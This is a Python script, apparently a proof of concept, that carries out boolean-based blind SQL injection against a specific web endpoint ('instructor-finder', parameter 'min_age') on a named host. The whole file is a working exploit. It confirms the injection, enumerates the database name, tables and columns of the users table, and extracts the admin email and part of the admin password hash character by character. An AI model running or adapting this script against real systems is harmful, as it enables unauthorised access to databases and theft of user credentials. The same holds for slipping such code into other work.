import requests
import string
import time
import sys

# Target configuration
TARGET = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io/instructor-finder"
PARAM = "min_age"
CHARSET = string.ascii_lowercase + string.digits + "_"
CHARSET_FULL = string.ascii_letters + string.digits + "@._-$/:=+"

def check_condition(condition):
    """Send request with SQL condition and check if it returns results"""
    payload = f"1 AND ({condition})"
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
        # TRUE condition returns ~246KB, FALSE returns ~104KB
        # Use length threshold of 150KB to determine true/false
        return len(response.text) > 150000
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_string(query, max_length=50, charset=CHARSET):
    """Extract a string character by character using boolean-based blind injection"""
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            if check_condition(condition):
                result += char
                print(f"\r[+] Extracting: {result}", end="", flush=True)
                found = True
                break
        if not found:
            break
    print()  # New line
    return result

def extract_number(query):
    """Extract a number using binary search"""
    low, high = 0, 1000
    while low < high:
        mid = (low + high) // 2
        condition = f"({query}) > {mid}"
        if check_condition(condition):
            low = mid + 1
        else:
            high = mid
    return low

def main():
    print("=" * 60)
    print("SQL Injection Database Dump - Proof of Concept")
    print("Target:", TARGET)
    print("=" * 60)
    
    # Step 1: Verify injection works
    print("\n[*] Step 1: Verifying SQL injection...")
    if check_condition("1=1"):
        print("[+] TRUE condition works - returns results")
    else:
        print("[-] TRUE condition failed")
        return
    
    if not check_condition("1=2"):
        print("[+] FALSE condition works - returns empty")
    else:
        print("[-] FALSE condition failed")
        return
    
    print("[+] SQL Injection CONFIRMED!\n")
    
    # Step 2: Extract database name
    print("[*] Step 2: Extracting database name...")
    db_name = extract_string("SELECT database()")
    print(f"[+] Database name: {db_name}\n")
    
    # Step 3: Count tables
    print("[*] Step 3: Counting tables...")
    table_count = extract_number("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()")
    print(f"[+] Number of tables: {table_count}\n")
    
    # Step 4: Extract first 5 table names
    print("[*] Step 4: Extracting table names (first 5)...")
    tables = []
    for i in range(5):
        table_name = extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1")
        if table_name:
            tables.append(table_name)
            print(f"    Table {i+1}: {table_name}")
        else:
            break
    print()
    
    # Step 5: Extract user table columns
    print("[*] Step 5: Extracting 'users' table columns...")
    for i in range(8):
        col_name = extract_string(f"SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT {i},1")
        if col_name:
            print(f"    Column {i+1}: {col_name}")
        else:
            break
    print()
    
    # Step 6: Count users
    print("[*] Step 6: Counting users...")
    user_count = extract_number("SELECT COUNT(*) FROM users")
    print(f"[+] Number of users: {user_count}\n")
    
    # Step 7: Extract first admin email
    print("[*] Step 7: Extracting admin user email...")
    admin_email = extract_string(
        "SELECT email FROM users WHERE role_name='admin' LIMIT 0,1",
        max_length=50,
        charset=CHARSET_FULL
    )
    print(f"[+] Admin email: {admin_email}\n")
    
    # Step 8: Extract admin password hash (first 20 chars)
    print("[*] Step 8: Extracting admin password hash (partial)...")
    admin_pass = extract_string(
        "SELECT password FROM users WHERE role_name='admin' LIMIT 0,1",
        max_length=20,
        charset=CHARSET_FULL
    )
    print(f"[+] Admin password hash (partial): {admin_pass}...\n")
    
    print("=" * 60)
    print("DATABASE DUMP COMPLETE - SQL INJECTION PROVEN!")
    print("=" * 60)

if __name__ == "__main__":
    main()
